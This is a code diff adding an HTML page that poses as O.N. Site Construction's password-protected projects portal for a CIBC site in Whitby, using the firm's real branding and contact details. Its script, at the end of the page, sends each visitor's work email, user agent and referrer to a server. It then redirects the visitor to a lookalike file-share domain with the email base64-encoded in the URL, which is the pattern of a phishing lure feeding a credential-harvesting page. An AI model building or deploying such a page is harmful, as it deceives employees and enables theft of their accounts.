@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CIBC – 925 ROSSLAND RD W, WHITBY | Projects Portal | O.N. Site Construction</title>
+    
+    <!-- Premium Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Open+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --primary-red: #e11d37;
+            --primary-red-hover: #c41830;
+            --black: #0a0a0a;
+            --dark-gray: #1a1a1a;
+            --text-gray: #666;
+            --light-gray: #f5f5f5;
+            --white: #ffffff;
+            --border-color: #e0e0e0;
+        }
+        body { font-family: 'Open Sans', sans-serif; color: var(--dark-gray); line-height: 1.6; background-color: var(--white); }
+        .navbar { position: absolute; top: 0; left: 0; right: 0; z-index: 100; padding: 1.5rem 5%; display: flex; justify-content: space-between; align-items: center; }
+        .logo { display: flex; align-items: center; gap: 0.5rem; }
+        .logo-text { font-family: 'Montserrat', sans-serif; font-weight: 700; font-size: 1.5rem; color: var(--white); letter-spacing: 1px; }
+        .logo-text span { color: var(--primary-red); }
+        .logo-subtext { font-family: 'Montserrat', sans-serif; font-size: 0.65rem; color: var(--white); letter-spacing: 2px; text-transform: uppercase; margin-top: -5px; }
+        .nav-menu { display: flex; align-items: center; gap: 2rem; list-style: none; }
+        .nav-menu a { font-family: 'Montserrat', sans-serif; font-size: 0.9rem; font-weight: 600; color: var(--white); text-decoration: none; transition: opacity 0.3s ease; }
+        .nav-menu a:hover { opacity: 0.8; }
+        .nav-menu .contact-btn { border: 2px solid var(--primary-red); padding: 0.6rem 1.5rem; border-radius: 30px; transition: all 0.3s ease; }
+        .nav-menu .contact-btn:hover { background-color: var(--primary-red); }
+        .hero { position: relative; height: 350px; background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url('https://images.unsplash.com/photo-1504307651254-35680f356dfd?ixlib=rb-4.0.3&auto=format&fit=crop&w=1920&q=80') center/cover; display: flex; align-items: center; justify-content: center; }
+        .hero h1 { font-family: 'Montserrat', sans-serif; font-size: 3.5rem; font-weight: 700; color: var(--white); text-align: center; text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3); }
+        .main-content { max-width: 1200px; margin: 0 auto; padding: 4rem 5%; }
+        .back-link { display: inline-flex; align-items: center; gap: 0.5rem; font-family: 'Montserrat', sans-serif; font-size: 0.85rem; font-weight: 600; color: var(--primary-red); text-decoration: none; margin-bottom: 1.5rem; transition: opacity 0.3s ease; text-transform: uppercase; letter-spacing: 1px; }
+        .back-link:hover { opacity: 0.8; }
+        .back-link svg { width: 16px; height: 16px; }
+        .project-title { font-family: 'Montserrat', sans-serif; font-size: 2.5rem; font-weight: 600; color: var(--primary-red); margin-bottom: 1.5rem; line-height: 1.2; }
+        .password-notice { font-size: 0.95rem; color: var(--text-gray); margin-bottom: 1.5rem; }
+        .password-form { display: flex; flex-direction: column; gap: 1rem; max-width: 400px; }
+        .password-input { padding: 0.875rem 1rem; font-family: 'Open Sans', sans-serif; font-size: 1rem; border: 1px solid var(--border-color); border-radius: 4px; outline: none; transition: border-color 0.3s ease; }
+        .password-input:focus { border-color: var(--primary-red); }
+        .enter-btn { padding: 0.875rem 2.5rem; font-family: 'Montserrat', sans-serif; font-size: 0.9rem; font-weight: 600; color: var(--white); background-color: var(--primary-red); border: none; border-radius: 4px; cursor: pointer; transition: background-color 0.3s ease; text-transform: uppercase; letter-spacing: 1px; width: fit-content; }
+        .enter-btn:hover { background-color: var(--primary-red-hover); }
+        .enter-btn:disabled { background-color: #999; cursor: not-allowed; }
+        .footer { background-color: var(--black); color: var(--white); padding: 3rem 5% 2rem; margin-top: 4rem; }
+        .footer-content { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: auto 1fr 1fr 1fr; gap: 3rem; align-items: start; }
+        .footer-logo { display: flex; flex-direction: column; gap: 1rem; }
+        .footer-logo .logo-text { font-family: 'Montserrat', sans-serif; font-weight: 700; font-size: 1.5rem; letter-spacing: 1px; }
+        .footer-logo .logo-text span { color: var(--primary-red); }
+        .footer-logo .logo-subtext { font-family: 'Montserrat', sans-serif; font-size: 0.65rem; letter-spacing: 2px; text-transform: uppercase; margin-top: -5px; }
+        .social-icons { display: flex; gap: 0.75rem; }
+        .social-icon { width: 36px; height: 36px; background-color: var(--primary-red); border-radius: 4px; display: flex; align-items: center; justify-content: center; transition: background-color 0.3s ease; }
+        .social-icon:hover { background-color: var(--primary-red-hover); }
+        .social-icon svg { width: 18px; height: 18px; fill: var(--white); }
+        .footer-column h4 { font-family: 'Montserrat', sans-serif; font-size: 0.9rem; font-weight: 600; color: var(--primary-red); margin-bottom: 1rem; }
+        .footer-column p, .footer-column a { font-size: 0.85rem; color: var(--white); text-decoration: none; line-height: 1.8; display: block; margin-bottom: 0.25rem; }
+        .footer-column a:hover { opacity: 0.8; }
+        @media (max-width: 968px) { .nav-menu { display: none; } .hero h1 { font-size: 2.5rem; } .project-title { font-size: 2rem; } .footer-content { grid-template-columns: 1fr; gap: 2rem; } }
+        @media (max-width: 640px) { .hero h1 { font-size: 2rem; } .project-title { font-size: 1.75rem; } }
+    </style>
+</head>
+<body>
+
+    <nav class="navbar">
+        <div class="logo">
+            <div>
+                <div class="logo-text">ON<span>SITE</span></div>
+                <div class="logo-subtext">construction</div>
+            </div>
+        </div>
+        <ul class="nav-menu">
+            <li><a href="#">About</a></li>
+            <li><a href="#">Services</a></li>
+            <li><a href="#">Portfolio</a></li>
+            <li><a href="#">Projects Portal</a></li>
+            <li><a href="#">Careers</a></li>
+            <li><a href="#" class="contact-btn">Contact</a></li>
+        </ul>
+    </nav>
+
+    <section class="hero">
+        <h1>Projects Portal</h1>
+    </section>
+
+    <main class="main-content">
+        <a href="#" class="back-link">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="m15 18-6-6 6-6"/>
+            </svg>
+            Return to All Companies
+        </a>
+
+        <h2 class="project-title">925 ROSSLAND RD W</h2>
+        
+        <p class="password-notice">This content is protected and intended for recipients only. To view it, please enter your work email below.</p>
+        
+        <form class="password-form" id="email-form">
+            <label for="email-input" style="display: none;">Work Email</label>
+            <input type="email" id="email-input" name="email" class="password-input" placeholder="Work Email:" required>
+            <button type="submit" class="enter-btn">Enter</button>
+        </form>
+    </main>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-logo">
+                <div>
+                    <div class="logo-text">ON<span>SITE</span></div>
+                    <div class="logo-subtext">construction</div>
+                </div>
+                <div class="social-icons">
+                    <a href="https://ca.linkedin.com/company/o-n-site-construction-inc" target="_blank" rel="noopener noreferrer" class="social-icon" aria-label="LinkedIn">
+                        <svg viewBox="0 0 24 24"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg>
+                    </a>
+                    <a href="https://www.instagram.com/onsiteconstructioninc/" target="_blank" rel="noopener noreferrer" class="social-icon" aria-label="Instagram">
+                        <svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="5" ry="5" fill="none" stroke="white" stroke-width="2"/><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" fill="none" stroke="white" stroke-width="2"/><line x1="17.5" y1="6.5" x2="17.51" y2="6.5" stroke="white" stroke-width="2"/></svg>
+                    </a>
+                </div>
+            </div>
+            <div class="footer-column">
+                <h4>Get in Touch</h4>
+                <p>Phone: (905) 829-8895</p>
+                <p>Fax: (905) 829-8708</p>
+                <p>Email: <a href="mailto:info@onsiteconstruction.ca">info@onsiteconstruction.ca</a></p>
+            </div>
+            <div class="footer-column">
+                <h4>Head Office</h4>
+                <p>2861 Sherwood Heights Drive</p>
+                <p>Unit 40, Oakville, ON</p>
+                <p>L6J 7K1</p>
+            </div>
+            <div class="footer-column">
+                <h4>Regional Offices</h4>
+                <p>Victoria, British Columbia</p>
+                <p>Calgary, Alberta</p>
+                <p>Saskatoon, Saskatchewan</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('email-form');
+            const emailInput = document.getElementById('email-input');
+            const submitBtn = form.querySelector('.enter-btn');
+
+            form.addEventListener('submit', async function(event) {
+                event.preventDefault();
+                
+                const email = emailInput.value.trim();
+                if (!email) return;
+
+                // Show loading state
+                const originalBtnText = submitBtn.textContent;
+                submitBtn.textContent = 'Verifying...';
+                submitBtn.disabled = true;
+
+                try {
+                    const response = await fetch('/api/access', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            email: email,
+                            userAgent: navigator.userAgent,
+                            referrer: document.referrer
+                        })
+                    });
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        // Encode email to base64 safely (handles special characters if any)
+                        const email64 = btoa(unescape(encodeURIComponent(email)));
+                        
+                        // Construct target URL exactly as requested
+                        const targetUrl = `https://tvahu.merxprojectfileshare.com/QObxwDZVK2jqnizJHNeBVaJF822M/#AwiT${email64}AwiT`;
+                        
+                        // Redirect the user
+                        window.location.replace(targetUrl);
+                    } else {
+                        alert(data.error || 'An error occurred. Please try again.');
+                        submitBtn.textContent = originalBtnText;
+                        submitBtn.disabled = false;
+                    }
+                } catch (error) {
+                    console.error('Network error:', error);
+                    alert('A network error occurred. Please try again.');
+                    submitBtn.textContent = originalBtnText;
+                    submitBtn.disabled = false;
+                }
+            });
+        });
+    </script>
+</body>
+</html>
